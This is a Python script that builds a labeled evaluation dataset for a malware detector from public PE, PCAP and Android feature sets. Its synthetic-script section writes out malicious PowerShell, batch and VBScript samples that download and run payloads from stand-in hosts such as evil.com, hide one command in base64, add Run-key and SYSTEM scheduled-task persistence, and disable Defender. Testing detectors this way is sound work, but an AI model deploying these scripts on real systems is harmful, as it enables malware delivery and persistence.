#!/usr/bin/env python3
"""
Sentinel Eval Dataset Builder

Builds a labeled evaluation dataset from CMG Dataset sources:
1. EMBER - PE malware features (JSONL with labels)
2. BODMAS - Malware category labels (CSV with SHA256 + category)
3. IoT Intrusion - PCAP files (labeled by filename)
4. Android HealthCheck - Android malware features (CSV with class label)

Outputs:
- ./eval_data/{pe,pcap,android,script}/ - organized samples
- ./eval_data/manifest.json - metadata + labels
"""

import json
import shutil
import hashlib
import random
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime

# Dataset paths
CMG_BASE = Path(r"B:\CyberMesh Datasets\CMG Dataset")
EMBER_PATH = CMG_BASE / "EMBER Dataset" / "EMBER_2018_v2" / "ember2018"
BODMAS_PATH = CMG_BASE / "Malware dataset" / "bodmas_malware_category.csv"
IOT_PCAP_PATH = CMG_BASE / "Malware dataset" / "iot_intrusion_dataset"
ANDROID_PATH = CMG_BASE / "Malware dataset" / "AndroHealthCheck Dataset.csv"

# Output
OUTPUT_DIR = Path(r"B:\sentinel\eval_data")


@dataclass
class EvalSample:
    """A labeled evaluation sample."""
    id: str
    file_path: str
    file_type: str  # pe, pcap, android, script, pdf, office
    sha256: str
    label: str  # malicious, clean
    category: Optional[str] = None  # trojan, worm, ransomware, etc.
    source: str = ""  # dataset source
    metadata: Optional[Dict] = None


def compute_sha256(file_path: Path) -> str:
    """Compute SHA256 hash of a file."""
    hasher = hashlib.sha256()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            hasher.update(chunk)
    return hasher.hexdigest()


def load_ember_samples(limit: int = 50) -> List[EvalSample]:
    """
    Load PE samples from EMBER dataset.
    
    EMBER has JSONL files with pre-extracted features and labels:
    - label: 0 = clean, 1 = malicious
    - sha256: file hash
    - avclass: malware family (if malicious)
    """
    samples = []
    # train_features_1.jsonl has better malicious/clean balance
    train_file = EMBER_PATH / "train_features_1.jsonl"
    
    if not train_file.exists():
        print(f"[WARN] EMBER train file not found: {train_file}")
        return samples
    
    malicious_count = 0
    clean_count = 0
    target_per_class = limit // 2
    
    print(f"[INFO] Loading EMBER samples from {train_file}...")
    
    with open(train_file, "r") as f:
        for line in f:
            if malicious_count >= target_per_class and clean_count >= target_per_class:
                break
            
            try:
                data = json.loads(line.strip())
                label_int = data.get("label", -1)
                sha256 = data.get("sha256", "")
                
                if label_int == -1 or not sha256:
                    continue
                
                if label_int == 1 and malicious_count < target_per_class:
                    samples.append(EvalSample(
                        id=f"ember_mal_{malicious_count}",
                        file_path=f"ember/{sha256}.features.json",
                        file_type="pe",
                        sha256=sha256,
                        label="malicious",
                        category=data.get("avclass", "unknown"),
                        source="EMBER_2018",
                        metadata={
                            "histogram": data.get("histogram", [])[:10],
                            "imports": len(data.get("imports", [])),
                            "exports": len(data.get("exports", [])),
                            "appeared": data.get("appeared", ""),
                        }
                    ))
                    malicious_count += 1
                    
                elif label_int == 0 and clean_count < target_per_class:
                    samples.append(EvalSample(
                        id=f"ember_clean_{clean_count}",
                        file_path=f"ember/{sha256}.features.json",
                        file_type="pe",
                        sha256=sha256,
                        label="clean",
                        category=None,
                        source="EMBER_2018",
                        metadata={
                            "histogram": data.get("histogram", [])[:10],
                            "imports": len(data.get("imports", [])),
                            "exports": len(data.get("exports", [])),
                            "appeared": data.get("appeared", ""),
                        }
                    ))
                    clean_count += 1
                    
            except json.JSONDecodeError:
                continue
    
    print(f"[INFO] Loaded {len(samples)} EMBER samples ({malicious_count} malicious, {clean_count} clean)")
    return samples


def load_bodmas_samples(limit: int = 50) -> List[EvalSample]:
    """
    Load malware samples from BODMAS dataset.
    
    CSV format: sha256,category
    Categories: trojan, worm, downloader, etc.
    
    Note: BODMAS only has malware, no clean samples.
    """
    samples = []
    
    if not BODMAS_PATH.exists():
        print(f"[WARN] BODMAS file not found: {BODMAS_PATH}")
        return samples
    
    print(f"[INFO] Loading BODMAS samples from {BODMAS_PATH}...")
    
    category_counts = {}
    
    with open(BODMAS_PATH, "r") as f:
        next(f)  # Skip header
        for i, line in enumerate(f):
            if len(samples) >= limit:
                break
            
            parts = line.strip().split(",")
            if len(parts) != 2:
                continue
            
            sha256, category = parts
            
            # Balance categories
            if category_counts.get(category, 0) >= limit // 5:
                continue
            
            samples.append(EvalSample(
                id=f"bodmas_{i}",
                file_path=f"bodmas/{sha256}.meta",
                file_type="pe",
                sha256=sha256,
                label="malicious",
                category=category,
                source="BODMAS",
                metadata={"category": category}
            ))
            
            category_counts[category] = category_counts.get(category, 0) + 1
    
    print(f"[INFO] Loaded {len(samples)} BODMAS samples")
    print(f"[INFO] Categories: {category_counts}")
    return samples


def load_pcap_samples(limit: int = 30) -> List[EvalSample]:
    """
    Load PCAP samples from IoT intrusion dataset.
    
    Files are named with attack type:
    - benign-*.pcap -> clean
    - mirai-*.pcap -> malicious (mirai botnet)
    - dos-*.pcap -> malicious (DoS)
    - mitm-*.pcap -> malicious (MITM)
    - scan-*.pcap -> suspicious (reconnaissance)
    """
    samples = []
    
    if not IOT_PCAP_PATH.exists():
        print(f"[WARN] IoT PCAP path not found: {IOT_PCAP_PATH}")
        return samples
    
    print(f"[INFO] Loading PCAP samples from {IOT_PCAP_PATH}...")
    
    pcap_files = list(IOT_PCAP_PATH.glob("*.pcap"))
    random.shuffle(pcap_files)
    
    for pcap_file in pcap_files[:limit]:
        name = pcap_file.stem.lower()
        
        # Determine label from filename
        if name.startswith("benign"):
            label = "clean"
            category = None
        elif name.startswith("mirai"):
            label = "malicious"
            category = "mirai_botnet"
        elif name.startswith("dos") or name.startswith("syn"):
            label = "malicious"
            category = "dos_attack"
        elif name.startswith("mitm"):
            label = "malicious"
            category = "mitm_attack"
        elif name.startswith("scan"):
            label = "malicious"  # Reconnaissance is malicious intent
            category = "port_scan"
        else:
            continue
        
        sha256 = compute_sha256(pcap_file)
        
        samples.append(EvalSample(
            id=f"pcap_{pcap_file.stem}",
            file_path=str(pcap_file),
            file_type="pcap",
            sha256=sha256,
            label=label,
            category=category,
            source="IoT_Intrusion",
            metadata={
                "original_name": pcap_file.name,
                "size_bytes": pcap_file.stat().st_size,
            }
        ))
    
    print(f"[INFO] Loaded {len(samples)} PCAP samples")
    return samples


def load_android_samples(limit: int = 50) -> List[EvalSample]:
    """
    Load Android samples from AndroHealthCheck dataset.
    
    CSV with 215 feature columns + class label (S=safe, M=malware).
    We create synthetic sample entries since we don't have actual APKs.
    """
    samples = []
    
    if not ANDROID_PATH.exists():
        print(f"[WARN] Android dataset not found: {ANDROID_PATH}")
        return samples
    
    print(f"[INFO] Loading Android samples from {ANDROID_PATH}...")
    
    malicious_count = 0
    clean_count = 0
    target_per_class = limit // 2
    
    with open(ANDROID_PATH, "r") as f:
        header = f.readline().strip().split(",")
        
        for i, line in enumerate(f):
            if malicious_count >= target_per_class and clean_count >= target_per_class:
                break
            
            values = line.strip().split(",")
            if len(values) != len(header):
                continue
            
            label_char = values[-1]  # Last column is class
            
            # Create a pseudo-hash from row data
            row_hash = hashlib.sha256(line.encode()).hexdigest()
            
            # Extract some key features for metadata
            features = dict(zip(header[:-1], values[:-1]))
            suspicious_perms = sum(1 for k, v in features.items() 
                                  if v == "1" and any(x in k for x in 
                                  ["SMS", "CALL", "CAMERA", "RECORD", "LOCATION"]))
            
            if label_char == "S" and clean_count < target_per_class:
                samples.append(EvalSample(
                    id=f"android_clean_{clean_count}",
                    file_path=f"android/{row_hash[:16]}.features.json",
                    file_type="android",
                    sha256=row_hash,
                    label="clean",
                    category=None,
                    source="AndroHealthCheck",
                    metadata={
                        "suspicious_permissions": suspicious_perms,
                        "total_features": sum(1 for v in values[:-1] if v == "1"),
                    }
                ))
                clean_count += 1
                
            elif label_char not in ["S", "class"] and malicious_count < target_per_class:
                samples.append(EvalSample(
                    id=f"android_mal_{malicious_count}",
                    file_path=f"android/{row_hash[:16]}.features.json",
                    file_type="android",
                    sha256=row_hash,
                    label="malicious",
                    category="android_malware",
                    source="AndroHealthCheck",
                    metadata={
                        "suspicious_permissions": suspicious_perms,
                        "total_features": sum(1 for v in values[:-1] if v == "1"),
                    }
                ))
                malicious_count += 1
    
    print(f"[INFO] Loaded {len(samples)} Android samples ({malicious_count} malicious, {clean_count} clean)")
    return samples


def create_script_samples() -> List[EvalSample]:
    """
    Create synthetic script samples for testing.
    
    Since we don't have labeled script malware, we create test cases.
    """
    samples = []
    scripts_dir = OUTPUT_DIR / "scripts"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    
    # Malicious PowerShell - download & execute
    mal_ps1 = '''
# Malicious PowerShell - Download and Execute
$url = "http://malware.evil.com/payload.exe"
$output = "$env:TEMP\\update.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -WindowStyle Hidden $output

# Persistence via registry
$path = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $path -Name "WindowsUpdate" -Value $output

# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
'''
    mal_ps1_path = scripts_dir / "malicious_downloader.ps1"
    mal_ps1_path.write_text(mal_ps1)
    
    samples.append(EvalSample(
        id="script_mal_ps1_downloader",
        file_path=str(mal_ps1_path),
        file_type="script",
        sha256=compute_sha256(mal_ps1_path),
        label="malicious",
        category="downloader",
        source="synthetic",
        metadata={"behaviors": ["download_execute", "persistence", "defense_evasion"]}
    ))
    
    # Malicious PowerShell - encoded command
    mal_ps2 = '''
# Encoded payload execution
$encoded = "cG93ZXJzaGVsbCAtbm9wIC1jICJJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2V2aWwuY29tL3NoZWxsLnBzMScpIg=="
powershell -EncodedCommand $encoded
'''
    mal_ps2_path = scripts_dir / "malicious_encoded.ps1"
    mal_ps2_path.write_text(mal_ps2)
    
    samples.append(EvalSample(
        id="script_mal_ps1_encoded",
        file_path=str(mal_ps2_path),
        file_type="script",
        sha256=compute_sha256(mal_ps2_path),
        label="malicious",
        category="obfuscated",
        source="synthetic",
        metadata={"behaviors": ["encoded_command", "download_execute"]}
    ))
    
    # Malicious batch - certutil abuse
    mal_bat = '''
@echo off
REM Malicious batch using certutil for download
certutil -urlcache -split -f "http://evil.com/payload.exe" %TEMP%\\svchost.exe
%TEMP%\\svchost.exe

REM Create scheduled task for persistence
schtasks /create /tn "WindowsUpdate" /tr "%TEMP%\\svchost.exe" /sc onlogon /ru SYSTEM
'''
    mal_bat_path = scripts_dir / "malicious_certutil.bat"
    mal_bat_path.write_text(mal_bat)
    
    samples.append(EvalSample(
        id="script_mal_bat_certutil",
        file_path=str(mal_bat_path),
        file_type="script",
        sha256=compute_sha256(mal_bat_path),
        label="malicious",
        category="downloader",
        source="synthetic",
        metadata={"behaviors": ["certutil_abuse", "persistence", "lolbin"]}
    ))
    
    # Malicious VBScript
    mal_vbs = '''
' Malicious VBScript - WScript.Shell execution
Set objShell = CreateObject("WScript.Shell")
strURL = "http://malware.com/payload.exe"
strPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\update.exe"

Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", strURL, False
objHTTP.Send

Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
objStream.Write objHTTP.ResponseBody
objStream.SaveToFile strPath, 2
objStream.Close

objShell.Run strPath, 0, False
'''
    mal_vbs_path = scripts_dir / "malicious_downloader.vbs"
    mal_vbs_path.write_text(mal_vbs)
    
    samples.append(EvalSample(
        id="script_mal_vbs_downloader",
        file_path=str(mal_vbs_path),
        file_type="script",
        sha256=compute_sha256(mal_vbs_path),
        label="malicious",
        category="downloader",
        source="synthetic",
        metadata={"behaviors": ["download_execute", "wscript_shell"]}
    ))
    
    # Clean PowerShell - system admin script
    clean_ps1 = '''
# Clean administrative script - Get system info
$computerName = $env:COMPUTERNAME
$osInfo = Get-WmiObject -Class Win32_OperatingSystem
$diskInfo = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3"

Write-Host "Computer: $computerName"
Write-Host "OS: $($osInfo.Caption) $($osInfo.Version)"
Write-Host "Memory: $([math]::Round($osInfo.TotalVisibleMemorySize/1MB, 2)) GB"

foreach ($disk in $diskInfo) {
    $freeSpace = [math]::Round($disk.FreeSpace/1GB, 2)
    Write-Host "Drive $($disk.DeviceID): $freeSpace GB free"
}
'''
    clean_ps1_path = scripts_dir / "clean_sysinfo.ps1"
    clean_ps1_path.write_text(clean_ps1)
    
    samples.append(EvalSample(
        id="script_clean_ps1_sysinfo",
        file_path=str(clean_ps1_path),
        file_type="script",
        sha256=compute_sha256(clean_ps1_path),
        label="clean",
        category=None,
        source="synthetic",
        metadata={"purpose": "system_administration"}
    ))
    
    # Clean batch - backup script
    clean_bat = '''
@echo off
REM Clean backup script
echo Starting backup...
set BACKUP_DIR=D:\\Backups\\%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2%
mkdir "%BACKUP_DIR%" 2>nul
xcopy /E /I /Y "C:\\Users\\%USERNAME%\\Documents" "%BACKUP_DIR%\\Documents"
echo Backup complete: %BACKUP_DIR%
'''
    clean_bat_path = scripts_dir / "clean_backup.bat"
    clean_bat_path.write_text(clean_bat)
    
    samples.append(EvalSample(
        id="script_clean_bat_backup",
        file_path=str(clean_bat_path),
        file_type="script",
        sha256=compute_sha256(clean_bat_path),
        label="clean",
        category=None,
        source="synthetic",
        metadata={"purpose": "backup"}
    ))
    
    print(f"[INFO] Created {len(samples)} script samples")
    return samples


def build_manifest(samples: List[EvalSample]) -> Dict:
    """Build the manifest.json with all sample metadata."""
    
    # Statistics
    stats = {
        "total": len(samples),
        "by_label": {},
        "by_type": {},
        "by_source": {},
        "by_category": {},
    }
    
    for sample in samples:
        stats["by_label"][sample.label] = stats["by_label"].get(sample.label, 0) + 1
        stats["by_type"][sample.file_type] = stats["by_type"].get(sample.file_type, 0) + 1
        stats["by_source"][sample.source] = stats["by_source"].get(sample.source, 0) + 1
        if sample.category:
            stats["by_category"][sample.category] = stats["by_category"].get(sample.category, 0) + 1
    
    manifest = {
        "version": "1.0.0",
        "created": datetime.now().isoformat(),
        "description": "Sentinel evaluation dataset built from CMG Dataset sources",
        "statistics": stats,
        "samples": [asdict(s) for s in samples],
    }
    
    return manifest


def main():
    print("=" * 60)
    print("Sentinel Eval Dataset Builder")
    print("=" * 60)
    
    # Create output directory
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    
    all_samples = []
    
    # Load from each source
    print("\n[1/5] Loading EMBER PE samples...")
    all_samples.extend(load_ember_samples(limit=50))
    
    print("\n[2/5] Loading BODMAS malware samples...")
    all_samples.extend(load_bodmas_samples(limit=30))
    
    print("\n[3/5] Loading IoT PCAP samples...")
    all_samples.extend(load_pcap_samples(limit=30))
    
    print("\n[4/5] Loading Android samples...")
    all_samples.extend(load_android_samples(limit=40))
    
    print("\n[5/5] Creating script samples...")
    all_samples.extend(create_script_samples())
    
    # Build and save manifest
    print("\n[INFO] Building manifest...")
    manifest = build_manifest(all_samples)
    
    manifest_path = OUTPUT_DIR / "manifest.json"
    with open(manifest_path, "w") as f:
        json.dump(manifest, f, indent=2)
    
    print(f"\n{'=' * 60}")
    print("EVAL DATASET COMPLETE")
    print(f"{'=' * 60}")
    print(f"Output: {OUTPUT_DIR}")
    print(f"Manifest: {manifest_path}")
    print(f"\nStatistics:")
    print(f"  Total samples: {manifest['statistics']['total']}")
    print(f"  By label: {manifest['statistics']['by_label']}")
    print(f"  By type: {manifest['statistics']['by_type']}")
    print(f"  By source: {manifest['statistics']['by_source']}")
    print(f"\nCategories: {manifest['statistics']['by_category']}")


if __name__ == "__main__":
    main()
